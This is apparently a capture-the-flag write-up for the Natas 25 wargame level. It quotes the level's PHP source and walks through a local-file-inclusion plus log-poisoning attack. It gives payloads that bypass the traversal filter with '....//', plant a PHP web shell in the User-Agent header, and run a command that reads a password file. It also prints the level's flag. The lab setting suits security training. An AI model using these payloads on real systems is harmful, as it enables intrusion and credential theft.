# Solution
```
cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE
```

```php
<?php    // cheers and <3 to malvina  
    // - morla    function setLanguage(){        /* language setup */        if(array_key_exists("lang",$_REQUEST))  
            if(safeinclude("language/" . $_REQUEST["lang"] ))  
                return 1;        safeinclude("language/en");   
    }  
      
    function safeinclude($filename){        // check for directory traversal        if(strstr($filename,"../")){            logRequest("Directory traversal attempt! fixing request.");            $filename=str_replace("../","",$filename);  
        }        // dont let ppl steal our passwords        if(strstr($filename,"natas_webpass")){            logRequest("Illegal file access detected! Aborting!");  
            exit(-1);  
        }        // add more checks...        if (file_exists($filename)) {   
            include($filename);  
            return 1;  
        }  
        return 0;  
    }  
      
    function listFiles($path){        $listoffiles=array();  
        if ($handle = opendir($path))  
            while (false !== ($file = readdir($handle)))  
                if ($file != "." && $file != "..")                    $listoffiles[]=$file;                closedir($handle);  
        return $listoffiles;  
    }   
      
    function logRequest($message){        $log="[". date("d.m.Y H::i:s",time()) ."]";        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];        $log=$log . " \"" . $message ."\"\n";         $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");        fwrite($fd,$log);        fclose($fd);  
    }  
?>
```


The snippet reveals us some special information.
1. There is a whitelisted directory - language - meaning we can't do absolute path like `/etc/passwd`
2. It blacklists `../` but not `....//`
3. The logs shows the user agent
4. There is a parameter `lang` that switches the language
=> This is a classic LFI + Log Poisoning vulnerability.


```
/?lang=....//logs/natas25_j7j8fob4tl4gqb9tkjv4dv966i.log
```

This payload confirms us that the site is LFI vulnerable.

```
GET /?lang=....//logs/natas25_j7j8fob4tl4gqb9tkjv4dv966i.log HTTP/1.1

User-Agent: <?php system($_GET['cmd']); ?>
```

We added the php payload to the `User-Agent`.

Execute with:
```
/?lang=....//logs/natas25_j7j8fob4tl4gqb9tkjv4dv966i.log&cmd=cat%20/etc/natas_webpass/natas26
```